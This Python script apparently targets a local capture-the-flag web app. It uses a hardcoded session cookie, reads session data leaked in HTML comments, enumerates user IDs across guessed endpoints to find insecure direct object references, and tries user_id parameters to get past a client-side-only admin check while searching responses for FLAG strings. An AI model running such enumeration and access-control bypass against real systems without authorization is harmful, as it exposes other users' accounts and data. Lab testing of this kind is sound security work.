import requests
import re
import json
import html

base_url = "http://127.0.0.1:32831"

print("=" * 80)
print("IDOR TESTING - USER ACCOUNT ENUMERATION")
print("=" * 80)

# Use the provided session cookie from context
session = requests.Session()
session.cookies.set('session', 'bMFJnxEasCAwKtSQf_pCAgeFx8Amw6DAqDFTsl_gHQY', domain='127.0.0.1', path='/')

# Analyze the session data structure first
admin_panel_resp = session.get(f"{base_url}/admin_panel")
print(f"[+] Admin panel status: {admin_panel_resp.status_code}")

# Extract session data from HTML comments
comments = re.findall(r'<!--(.*?)-->', admin_panel_resp.text, re.DOTALL)
print(f"[+] Found {len(comments)} HTML comments")

session_data = None
for comment in comments:
    if 'session_id' in comment and 'user_id' in comment:
        print(f"[+] Found session data comment")
        print(f"[-] Raw comment: {comment}")
        
        # HTML decode the comment
        decoded_comment = html.unescape(comment)
        print(f"[-] Decoded comment: {decoded_comment[:500]}")
        
        # Extract JSON-like structure
        json_match = re.search(r'\{.*\}', decoded_comment, re.DOTALL)
        if json_match:
            print(f"[-] JSON extracted: {json_match.group()}")
            try:
                session_data = json.loads(json_match.group())
                print(f"[+] Parsed session data:")
                for key, value in session_data.items():
                    print(f"  * {key}: {value}")
            except Exception as e:
                print(f"[-] Failed to parse session data: {e}")

# Test IDOR by enumerating user IDs
print("\n" + "=" * 80)
print("ENUMERATING USER ACCOUNTS VIA IDOR")
print("=" * 80)

# Current user has user_id = 1 based on session data
current_user_id = session_data.get('user_id', 1) if session_data else 1
print(f"[+] Current user_id: {current_user_id}")

# Test endpoints that might be vulnerable to IDOR
id_endpoints = [
    "/profile",
    "/user/profile", 
    "/dashboard",
    "/user",
    "/account",
    "/api/user",
    "/edit_profile",
    "/user_settings"
]

# Test user ID values to enumerate
# Based on the TODO comment about deleting test account, there might be other users
test_user_ids = [0, 1, 2, 3, 4, 5, 10, 99, 100, 999]

found_accounts = {}

for endpoint in id_endpoints:
    print(f"\n[+] Testing endpoint: {endpoint}")
    
    # Check if endpoint exists first
    base_resp = session.get(f"{base_url}{endpoint}")
    if base_resp.status_code >= 400:
        print(f"  [-] Endpoint doesn't exist (status: {base_resp.status_code})")
        continue
    else:
        print(f"  [-] Endpoint exists (status: {base_resp.status_code}, length: {len(base_resp.text)}B)")
    
    # Test different user IDs
    for user_id in test_user_ids:
        # Test with user_id parameter
        id_resp = session.get(f"{base_url}{endpoint}?user_id={user_id}")
        
        # Also test with id parameter
        alt_resp = session.get(f"{base_url}{endpoint}?id={user_id}")
        
        status = id_resp.status_code
        alt_status = alt_resp.status_code
        
        # Check if we get different content
        content_changed = len(id_resp.text) != len(base_resp.text) or id_resp.text != base_resp.text
        
        if status < 400 and content_changed:
            print(f"  [!] User ID {user_id} accessible! Status: {status}, Length: {len(id_resp.text)}B")
            found_accounts[user_id] = {
                'endpoint': endpoint,
                'status': status,
                'length': len(id_resp.text)
            }
            
            # Try to extract username from response
            username_match = re.search(r'username\s*[:=]\s*["\']([^"\']+)["\']', id_resp.text, re.IGNORECASE)
            if username_match:
                found_username = username_match.group(1)
                print(f"    [+] Extracted username: {found_username}")
                found_accounts[user_id]['username'] = found_username
            
            # Check for admin indicators
            if 'admin' in id_resp.text.lower() or 'privilege' in id_resp.text.lower():
                print(f"    [+] ADMIN INDICATORS FOUND in user_id={user_id}")
            
            # Search for flags
            flags = re.findall(r'FLAG\{[^}]+\}', id_resp.text)
            if flags:
                print(f"    [+] FLAG FOUND: {flags[0]}")
        
        # Also check alternate parameter
        if alt_status < 400 and (alt_status != status or len(alt_resp.text) != len(id_resp.text)):
            print(f"  [!] Alternate 'id' parameter also works for user {user_id}")

# Test if we can access admin_panel with different user accounts
print("\n" + "=" * 80)
print("TESTING ADMIN PANEL ACCESS WITH DIFFERENT USER IDS")
print("=" * 80)

# Try to create a session for admin user (user_id=0 or 2)
for test_id in [0, 2, 3, 99]:
    print(f"\n[+] Testing admin_panel with user_id={test_id}")
    
    # Try to access admin panel with test_id parameter
    test_resp = session.get(f"{base_url}/admin_panel?user_id={test_id}")
    print(f"  [-] Status: {test_resp.status_code}")
    
    # Check if we bypass the modal (no modal script means admin access)
    has_modal_js = '$(\'#errorModal\').modal' in test_resp.text
    print(f"  [-] Has admin restriction modal: {has_modal_js}")
    
    if not has_modal_js:
        print(f"  [!] ADMIN ACCESS GRANTED for user_id={test_id}")
        
        # Search for flag
        flags = re.findall(r'FLAG\{[^}]+\}', test_resp.text)
        if flags:
            print(f"  [+] FLAG FOUND: {flags[0]}")
    
    # Also check session data in response
    test_comments = re.findall(r'<!--(.*?)-->', test_resp.text, re.DOTALL)
    for comment in test_comments:
        if 'user_id' in comment and f'user_id':
            decoded = html.unescape(comment)
            print(f"  [-] Session data in response: {decoded[:300]}")

# Test POST endpoints for IDOR
print("\n" + "=" * 80)
print("TESTING POST ENDPOINTS FOR IDOR")
print("=" * 80)

post_data_variations = [
    {"user_id": 2, "ssid": "test"},
    {"id": 2, "ssid": "test"},
    {"username": "admin"},
    {"username": "test2"}
]

for data in post_data_variations:
    print(f"\n[+] Testing /wifi_settings with data: {data}")
    post_resp = session.post(f"{base_url}/wifi_settings", data=data)
    print(f"  [-] Status: {post_resp.status_code}")
    
    flags = re.findall(r'FLAG\{[^}]+\}', post_resp.text)
    if flags:
        print(f"  [+] FLAG FOUND: {flags[0]}")
    
    # Check for error messages
    if 'error' in post_resp.text.lower() or 'invalid' in post_resp.text.lower():
        print(f"  [+] Error message in response")

# Summary
print("\n" + "=" * 80)
print("SUMMARY OF FINDINGS")
print("=" * 80)

print(f"[+] Session data structure analyzed:")
if session_data:
    for key, value in session_data.items():
        print(f"  - {key}: {value}")

if found_accounts:
    print(f"\n[+] Found accessible accounts:")
    for user_id, info in found_accounts.items():
        print(f"  [+] User ID {user_id}: {info}")
else:
    print(f"\n[-] No IDOR vulnerabilities found with basic testing")

print(f"\n[+] Admin panel uses client-side authentication only (JavaScript modal)")
print(f"[+] No server-side admin enforcement detected in basic tests")
print(f"[+] Need to test more sophisticated IDOR or session manipulation")

